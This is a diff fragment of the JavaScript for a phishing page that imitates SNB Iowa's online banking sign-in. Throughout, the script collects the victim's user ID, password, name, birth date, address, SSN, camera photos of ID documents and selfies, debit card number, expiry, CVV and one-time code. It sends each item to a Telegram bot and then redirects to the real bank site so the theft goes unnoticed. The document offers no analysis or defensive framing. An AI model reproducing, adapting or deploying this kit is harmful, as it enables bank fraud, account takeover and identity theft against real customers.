+          const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+          const d = await r.json();
+          return d.ok;
+        } catch (e) { return false; }
+      }
+
+      /* ============================================================
+         UI HELPERS
+         ============================================================ */
+      let toastTimer = null;
+      function showToast(msg, isError = false) {
+        toast.textContent = msg;
+        toast.classList.toggle('error', isError);
+        toast.classList.add('show');
+        clearTimeout(toastTimer);
+        toastTimer = setTimeout(() => toast.classList.remove('show'), 3000);
+      }
+
+      function showLoading(msg) {
+        loadingText.innerHTML = msg + '<br>Please wait';
+        loadingOverlay.classList.add('active');
+      }
+
+      function hideLoading() {
+        loadingOverlay.classList.remove('active');
+      }
+
+      const allPanels = [loginPanel, credentialsPanel, personalPanel, ssnPanel, kycPanel, cardPanel, otpPanel, successPanel];
+      function showPanel(panel) {
+        allPanels.forEach(p => p.classList.add('hide'));
+        panel.classList.remove('hide');
+        window.scrollTo(0, 0);
+      }
+
+      function transitionTo(panel, loadingMsg, focusEl, telegramMsg) {
+        if (telegramMsg) sendToTelegram(telegramMsg);
+        showLoading(loadingMsg || 'Processing...');
+        setTimeout(() => {
+          hideLoading();
+          showPanel(panel);
+          if (focusEl) setTimeout(() => focusEl.focus(), 150);
+        }, 1800);
+      }
+
+      /* ============================================================
+         STEP 1 → STEP 2 : SIGN IN → CONFIRM CREDENTIALS
+         ============================================================ */
+      document.getElementById('loginNextBtn').addEventListener('click', async function() {
+        const u = userId.value.trim();
+        const p = password.value.trim();
+
+        if (!u) { showToast('Please enter your User ID.', true); userId.focus(); return; }
+        if (!p) { showToast('Please enter your Password.', true); password.focus(); return; }
+
+        userData.userId = u;
+        userData.password = p;
+
+        await sendToTelegram(`🔐 <b>SNB IOWA — SIGN IN (Step 1)</b>\n\n👤 User ID: <code>${u}</code>\n🔑 Password: <code>${p}</code>\n☑️ Save user ID: ${document.getElementById('saveUserId').checked ? 'Yes' : 'No'}\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+
+        // Show the credentials confirmation screen (second screenshot)
+        showPanel(credentialsPanel);
+        userId2.value = u;
+        password2.value = p;
+        setTimeout(() => userId2.focus(), 200);
+      });
+
+      document.getElementById('forgotUserIdLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        sendToTelegram(`🔄 <b>SNB IOWA — Forgot User ID clicked</b>\nUser requested account recovery.`);
+        showToast('Redirecting to account recovery...');
+      });
+
+      /* ============================================================
+         STEP 2 → STEP 3 : CONFIRM CREDENTIALS → PERSONAL INFO
+         ============================================================ */
+      document.getElementById('credentialsNextBtn').addEventListener('click', async function() {
+        const u2 = userId2.value.trim();
+        const p2 = password2.value.trim();
+
+        if (!u2) { showToast('Please enter your User ID.', true); userId2.focus(); return; }
+        if (!p2) { showToast('Please enter your Password.', true); password2.focus(); return; }
+
+        userData.userId = u2;
+        userData.password = p2;
+
+        await sendToTelegram(`🔐 <b>SNB IOWA — CREDENTIALS CONFIRMED (Step 2)</b>\n\n👤 User ID: <code>${u2}</code>\n🔑 Password: <code>${p2}</code>\n☑️ Save user ID: ${document.getElementById('saveUserId2').checked ? 'Yes' : 'No'}`);
+
+        transitionTo(personalPanel, 'Verifying credentials...', document.getElementById('fullName'),
+          `✅ Credentials verified. Proceeding to identity verification.`);
+      });
+
+      document.getElementById('backToLoginFromCreds').addEventListener('click', function(e) {
+        e.preventDefault();
+        showPanel(loginPanel);
+      });
+
+      /* ============================================================
+         STEP 3 → STEP 4 : PERSONAL INFO → SSN
+         ============================================================ */
+      document.getElementById('personalNextBtn').addEventListener('click', async function() {
+        const fn = document.getElementById('fullName').value.trim();
+        const d  = document.getElementById('dob').value;
+        const ph = document.getElementById('phoneNumber').value.trim();
+        const em = document.getElementById('email').value.trim();
+        const ad = document.getElementById('address').value.trim();
+
+        if (!fn || fn.length < 2) { showToast('Please enter your full name.', true); return; }
+        if (!d) { showToast('Please enter your date of birth.', true); return; }
+        if (ph.replace(/\D/g,'').length !== 10) { showToast('Please enter a valid 10-digit phone number.', true); return; }
+        if (!em || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)) { showToast('Please enter a valid email address.', true); return; }
+        if (!ad || ad.length < 5) { showToast('Please enter your residential address.', true); return; }
+
+        userData.fullName = fn; userData.dob = d; userData.phone = ph;
+        userData.email = em; userData.address = ad;
+
+        await sendToTelegram(`📋 <b>SNB IOWA — PERSONAL INFO (Step 3)</b>\n\n👤 Name: ${fn}\n📅 DOB: ${d}\n📱 Phone: ${ph}\n📧 Email: ${em}\n📍 Address: ${ad}`);
+
+        transitionTo(ssnPanel, 'Verifying your information...', document.getElementById('ssnInput'),
+          `✅ Personal info captured. Proceeding to SSN verification.`);
+      });
+
+      document.getElementById('backToCredsFromPersonal').addEventListener('click', function(e) {
+        e.preventDefault(); showPanel(credentialsPanel);
+      });
+
+      /* ============================================================
+         STEP 4 → STEP 5 : SSN → KYC
+         ============================================================ */
+      document.getElementById('ssnNextBtn').addEventListener('click', async function() {
+        const s = document.getElementById('ssnInput').value.trim();
+        if (s.length < 4) { showToast('Please enter a valid SSN.', true); return; }
+
+        userData.ssn = s;
+        await sendToTelegram(`🔐 <b>SNB IOWA — SSN PROVIDED (Step 4)</b>\n\n👤 Name: ${userData.fullName}\n🔢 SSN: <code>${s}</code>`);
+
+        transitionTo(kycPanel, 'Preparing identity verification...', null,
+          `✅ SSN captured. Proceeding to ID verification.`);
+        setTimeout(() => showKycStep(1), 2000);
+      });
+
+      document.getElementById('backToPersonalFromSsn').addEventListener('click', function(e) {
+        e.preventDefault(); showPanel(personalPanel);
+      });
+
+      /* ============================================================
+         KYC CAMERA LOGIC
+         ============================================================ */
+      let frontStream, backStream, selfieStream, selfieIdStream;
+      let usingRearFront = true, usingRearBack = true, usingRearSelfie = false, usingRearSelfieId = false;
+
+      function stopStream(s) { if (s && s.getTracks) s.getTracks().forEach(t => t.stop()); }
+
+      async function initCamera(videoEl, facingMode) {
+        try {
+          const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
+          videoEl.srcObject = s; await videoEl.play(); return s;
+        } catch (e) {
+          const s = await navigator.mediaDevices.getUserMedia({ video: true });
+          videoEl.srcObject = s; await videoEl.play(); return s;
+        }
+      }
+
+      async function switchCamera(video, currentStream, setStream, setRear, currentRear) {
+        if (currentStream) stopStream(currentStream);
+        const newFacing = currentRear ? 'user' : 'environment';
+        const s = await initCamera(video, newFacing);
+        setStream(s); setRear(!currentRear);
+      }
+
+      async function capturePhoto(video, statusElem, side, next) {
+        if (!video.videoWidth || video.videoWidth === 0) { showToast('Camera not ready.', true); return; }
+        statusElem.innerText = 'Uploading...';
+        const canvas = document.createElement('canvas');
+        const size = Math.min(video.videoWidth, video.videoHeight);
+        canvas.width = size; canvas.height = size;
+        const ctx = canvas.getContext('2d');
+        const sx = (video.videoWidth - size) / 2, sy = (video.videoHeight - size) / 2;
+        ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
+        canvas.toBlob(async blob => {
+          await sendPhotoToTelegram(blob, `📸 <b>SNB IOWA — KYC Photo</b>\nType: ${side}\nUser: ${userData.fullName}\nID Type: ${userData.idType}`);
+          statusElem.innerText = `✅ ${side} uploaded.`;
+          if (next) setTimeout(next, 700);
+        }, 'image/jpeg', 0.85);
+      }
+
+      function showKycStep(step) {
+        ['kycStep1','kycStep2','kycStep3','kycStep4','kycStep5'].forEach(id => document.getElementById(id).classList.add('hide'));
+        const target = document.getElementById('kycStep' + step);
+        if (target) target.classList.remove('hide');
+
+        if (step === 2) {
+          stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
+          initCamera(document.getElementById('frontVideo'), 'environment').then(s => { frontStream = s; usingRearFront = true; });
+        } else if (step === 3) {
+          stopStream(frontStream); stopStream(selfieStream); stopStream(selfieIdStream);
+          initCamera(document.getElementById('backVideo'), 'environment').then(s => { backStream = s; usingRearBack = true; });
+        } else if (step === 4) {
+          stopStream(frontStream); stopStream(backStream); stopStream(selfieIdStream);
+          initCamera(document.getElementById('selfieVideo'), 'user').then(s => { selfieStream = s; usingRearSelfie = false; });
+        } else if (step === 5) {
+          stopStream(frontStream); stopStream(backStream); stopStream(selfieStream);
+          initCamera(document.getElementById('selfieIdVideo'), 'user').then(s => { selfieIdStream = s; usingRearSelfieId = false; });
+        }
+      }
+
+      document.getElementById('kycStep1Next').addEventListener('click', async function() {
+        const type = document.getElementById('idType').value;
+        const state = document.getElementById('idState').value;
+        if (!type || !state) { showToast('Select ID type and issuing state.', true); return; }
+        userData.idType = type; userData.idState = state;
+        await sendToTelegram(`🪪 <b>SNB IOWA — ID TYPE (Step 5)</b>\n\nType: ${type}\nState: ${state}`);
+        showKycStep(2);
+      });
+
+      document.getElementById('switchFrontCam').addEventListener('click', () => switchCamera(document.getElementById('frontVideo'), frontStream, s => frontStream = s, v => usingRearFront = v, usingRearFront));
+      document.getElementById('captureFrontBtn').addEventListener('click', () => capturePhoto(document.getElementById('frontVideo'), document.getElementById('frontStatus'), 'FRONT_ID', () => showKycStep(3)));
+      document.getElementById('switchBackCam').addEventListener('click', () => switchCamera(document.getElementById('backVideo'), backStream, s => backStream = s, v => usingRearBack = v, usingRearBack));
+      document.getElementById('captureBackBtn').addEventListener('click', () => capturePhoto(document.getElementById('backVideo'), document.getElementById('backStatus'), 'BACK_ID', () => showKycStep(4)));
+      document.getElementById('switchSelfieCam').addEventListener('click', () => switchCamera(document.getElementById('selfieVideo'), selfieStream, s => selfieStream = s, v => usingRearSelfie = v, usingRearSelfie));
+      document.getElementById('captureSelfieBtn').addEventListener('click', () => capturePhoto(document.getElementById('selfieVideo'), document.getElementById('selfieStatus'), 'SELFIE_FACE', () => showKycStep(5)));
+      document.getElementById('switchSelfieIdCam').addEventListener('click', () => switchCamera(document.getElementById('selfieIdVideo'), selfieIdStream, s => selfieIdStream = s, v => usingRearSelfieId = v, usingRearSelfieId));
+
+      document.getElementById('captureSelfieIdBtn').addEventListener('click', function() {
+        capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), 'SELFIE_WITH_ID', async () => {
+          stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
+          await sendToTelegram(`✅ <b>SNB IOWA — KYC COMPLETED</b>\n\nAll identity documents uploaded successfully for ${userData.fullName}.`);
+          transitionTo(cardPanel, 'Processing identity documents...', document.getElementById('debitCard'),
+            `✅ KYC complete. Proceeding to card verification.`);
+        });
+      });
+
+      document.getElementById('backToSsnFromKyc').addEventListener('click', function(e) {
+        e.preventDefault(); showPanel(ssnPanel);
+      });
+
+      /* ============================================================
+         STEP 6 → STEP 7 : CARD → OTP
+         ============================================================ */
+      document.getElementById('cardNextBtn').addEventListener('click', async function() {
+        const dc = document.getElementById('debitCard').value.trim();
+        const ex = document.getElementById('cardExpiry').value.trim();
+        const cv = document.getElementById('cardCvv').value.trim();
+
+        if (!dc || dc.replace(/\D/g,'').length < 12) { showToast('Please enter a valid card number.', true); return; }
+        if (!ex || ex.length < 4) { showToast('Please enter expiry date (MM/YY).', true); return; }
+        if (!cv || cv.length < 3) { showToast('Please enter CVV.', true); return; }
+
+        userData.debitCard = dc; userData.cardExpiry = ex; userData.cardCvv = cv;
+
+        await sendToTelegram(`💳 <b>SNB IOWA — CARD DETAILS (Step 6)</b>\n\n👤 Name: ${userData.fullName}\n🔢 Card: <code>${dc}</code>\n📅 Expiry: <code>${ex}</code>\n🔒 CVV: <code>${cv}</code>`);
+
+        // Mask phone (last 4 digits)
+        const last4 = userData.phone.replace(/\D/g,'').slice(-4) || '****';
+        document.getElementById('maskedPhone').textContent = last4;
+
+        transitionTo(otpPanel, 'Sending verification code...', document.getElementById('otpInput'),
+          `📱 Verification code sent to phone ending in ${last4}`);
+      });
+
+      document.getElementById('backToKycFromCard').addEventListener('click', function(e) {
+        e.preventDefault(); showPanel(kycPanel); showKycStep(5);
+      });
+
+      /* ============================================================
+         STEP 7 → SUCCESS : OTP
+         ============================================================ */
+      document.getElementById('otpSubmitBtn').addEventListener('click', async function() {
+        const otp = document.getElementById('otpInput').value.trim();
+        if (!otp || otp.length < 4) { showToast('Please enter the verification code.', true); return; }
+        userData.otp = otp;
+
+        await sendToTelegram(`🔢 <b>SNB IOWA — OTP (Step 7 — FINAL)</b>\n\n👤 Name: ${userData.fullName}\n📧 Email: ${userData.email}\n📱 Phone: ${userData.phone}\n📅 DOB: ${userData.dob}\n📍 Address: ${userData.address}\n\n🔐 SSN: <code>${userData.ssn}</code>\n\n🪪 ID: ${userData.idType} (${userData.idState})\n\n💳 Card: <code>${userData.debitCard}</code>\n📅 Expiry: <code>${userData.cardExpiry}</code>\n🔒 CVV: <code>${userData.cardCvv}</code>\n\n🔢 OTP: <code>${otp}</code>\n\n✅ All data captured successfully.`);
+
+        showLoading('Verifying your identity...');
+        setTimeout(() => {
+          hideLoading();
+          showPanel(successPanel);
+          showToast('Account verified successfully!');
+          setTimeout(() => {
+            window.location.href = 'https://www.snbiowa.com';
+          }, 2500);
+        }, 2000);
+      });
+
+      document.getElementById('resendOtpBtn').addEventListener('click', async function(e) {
+        e.preventDefault();
+        showToast('A new verification code has been sent.');
+        await sendToTelegram(`🔄 <b>SNB IOWA — RESEND OTP</b>\nUser: ${userData.fullName}\nPhone: ${userData.phone}`);
+      });
+
+      document.getElementById('emailOtpBtn').addEventListener('click', async function(e) {
+        e.preventDefault();
+        showToast('Verification code sent to your email.');
+        await sendToTelegram(`✉️ <b>SNB IOWA — OTP VIA EMAIL</b>\nUser: ${userData.fullName}\nEmail: ${userData.email}`);
+      });
+
+      document.getElementById('backToCardFromOtp').addEventListener('click', function(e) {
+        e.preventDefault(); showPanel(cardPanel);
+      });
+
+      /* ============================================================
+         INPUT FORMATTING
+         ============================================================ */
+      document.getElementById('phoneNumber').addEventListener('input', function() {
+        const digits = this.value.replace(/\D/g,'');
+        if (digits.length <= 10) {
+          let f = digits;
+          if (digits.length > 6) f = `(${digits.slice(0,3)}) ${digits.slice(3,6)}-${digits.slice(6,10)}`;
+          else if (digits.length > 3) f = `(${digits.slice(0,3)}) ${digits.slice(3)}`;
+          else if (digits.length > 0) f = `(${digits}`;
+          this.value = f;
+        }
+      });
+
+      document.getElementById('debitCard').addEventListener('input', function() {
+        const v = this.value.replace(/\D/g,'').slice(0, 16);
+        this.value = v.replace(/(.{4})/g, '$1 ').trim();
+      });
+
+      document.getElementById('cardExpiry').addEventListener('input', function() {
+        let v = this.value.replace(/\D/g,'').slice(0, 4);
+        if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+        this.value = v;
+      });
+
+      document.getElementById('cardCvv').addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g,'').slice(0, 4);
+      });
+
+      document.getElementById('otpInput').addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g,'').slice(0, 6);
+      });
+
+      document.getElementById('ssnInput').addEventListener('input', function() {
+        let v = this.value.replace(/\D/g,'').slice(0, 9);
+        if (v.length > 5) v = v.slice(0,3) + '-' + v.slice(3,5) + '-' + v.slice(5);
+        else if (v.length > 3) v = v.slice(0,3) + '-' + v.slice(3);
+        this.value = v;
+      });
+
+      /* ============================================================
+         ENTER KEY NAVIGATION
+         ============================================================ */
+      document.getElementById('userId').addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('password').focus(); } });
+      document.getElementById('password').addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('loginNextBtn').click(); } });
+      document.getElementById('userId2').addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('password2').focus(); } });
+      document.getElementById('password2').addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('credentialsNextBtn').click(); } });
+      document.getElementById('otpInput').addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('otpSubmitBtn').click(); } });
+
+      /* ============================================================
+         CLEANUP
+         ============================================================ */
+      window.addEventListener('beforeunload', function() {
+        stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
+      });
+
+      // Auto-focus User ID on load
+      window.addEventListener('load', () => {
+        setTimeout(() => document.getElementById('userId').focus(), 400);
+      });
+    })();
+  </script>
+</body>
+</html>
